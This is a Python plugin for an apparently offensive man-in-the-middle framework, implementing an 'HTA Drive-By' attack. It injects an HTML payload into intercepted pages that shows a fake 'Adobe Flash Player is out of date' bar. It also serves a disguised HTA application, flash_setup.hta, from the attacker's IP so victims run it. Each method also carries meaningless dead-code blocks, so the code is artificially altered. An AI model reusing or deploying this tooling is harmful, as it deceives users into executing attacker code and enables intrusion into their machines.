import re
from plugins.plugin import Plugin
from plugins.inject import Inject

class HTADriveBy(Inject, Plugin):
    name = 'HTA Drive-By'
    desc = 'Performs HTA drive-by attacks on clients'
    optname = 'hta'
    ver = '0.1'

    def initialize(self, options):
        if False:
            i = 10
            return i + 15
        self.bar_text = options.text
        self.ip = options.ip
        self.hta = options.hta_app.split('/')[-1]
        Inject.initialize(self, options)
        self.html_payload = self.get_payload()
        from core.servers.HTTP import HTTP
        HTTP.add_static_endpoint(self.hta, 'application/hta', options.hta_app)

    def get_payload(self):
        if False:
            i = 10
            return i + 15
        with open('./core/html/htadriveby.html', 'r') as file:
            payload = re.sub('_TEXT_GOES_HERE_', self.bar_text, file.read())
            payload = re.sub('_IP_GOES_HERE_', self.ip, payload)
            payload = re.sub('_PAYLOAD_GOES_HERE_', self.hta, payload)
        return payload

    def options(self, options):
        if False:
            i = 10
            return i + 15
        options.add_argument('--text', type=str, default='The Adobe Flash Player plug-in was blocked because it is out of date.', help='Text to display on notification bar')
        options.add_argument('--hta-app', type=str, default='./config/hta_driveby/flash_setup.hta', help='Path to HTA application [defaults to config/hta_driveby/flash_setup.hta]')